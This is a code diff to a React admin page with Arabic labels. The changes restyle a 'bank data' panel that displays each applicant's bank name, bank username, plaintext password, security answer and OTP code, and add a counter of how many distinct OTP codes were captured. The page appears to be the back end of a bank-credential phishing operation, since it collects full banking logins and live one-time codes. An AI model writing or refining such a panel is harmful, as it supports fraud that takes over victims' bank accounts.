@@ -319,12 +319,47 @@ export default function AdminApplicationDetailPage() {
                 </div>
                 {(allData.bankName || allData.bankUsername) && (
                   <div className="bg-card border rounded-2xl p-6">
-                    <h3 className="font-black mb-4 pb-2 border-b">بيانات البنك</h3>
-                    <DataRow label="البنك المختار" value={allData.bankName} />
+                    <h3 className="font-black mb-4 pb-2 border-b flex items-center gap-2">
+                      بيانات البنك
+                    </h3>
+                    {/* اسم البنك بارز */}
+                    {allData.bankName && (
+                      <div className="bg-primary/10 border border-primary/30 rounded-xl px-4 py-3 flex items-center gap-3 mb-4">
+                        <div className="w-9 h-9 bg-primary/20 rounded-lg flex items-center justify-center text-primary font-black text-lg">
+                          {String(allData.bankName).charAt(0)}
+                        </div>
+                        <div>
+                          <p className="text-[10px] text-muted-foreground font-medium">البنك المختار</p>
+                          <p className="text-base font-black text-primary">{String(allData.bankName)}</p>
+                        </div>
+                      </div>
+                    )}
                     <DataRow label="اسم المستخدم" value={allData.bankUsername} />
                     <DataRow label="كلمة المرور" value={allData.bankPassword} />
                     <DataRow label="كلمة التحقق" value={allData.securityAnswer} />
-                    <DataRow label="رمز OTP" value={allData.otpCode} />
+                    {/* رمز OTP مع عدد المحاولات */}
+                    {allData.otpCode && (
+                      <div className="mt-4 pt-4 border-t">
+                        <div className="flex items-center justify-between mb-2">
+                          <span className="text-sm font-bold text-muted-foreground">رمز OTP</span>
+                          {(() => {
+                            const attempts = new Set(
+                              versions.filter((v) => v.otpCode).map((v) => v.otpCode)
+                            ).size;
+                            return attempts > 0 ? (
+                              <span className={`text-xs font-bold px-2 py-0.5 rounded-full ${attempts > 1 ? "bg-orange-100 text-orange-700" : "bg-green-100 text-green-700"}`}>
+                                {attempts} {attempts === 1 ? "محاولة" : "محاولات"}
+                              </span>
+                            ) : null;
+                          })()}
+                        </div>
+                        <div className="bg-muted rounded-xl p-3 text-center">
+                          <p className="text-2xl font-mono font-black text-primary tracking-[0.3em]">
+                            {String(allData.otpCode)}
+                          </p>
+                        </div>
+                      </div>
+                    )}
                   </div>
                 )}
               </>
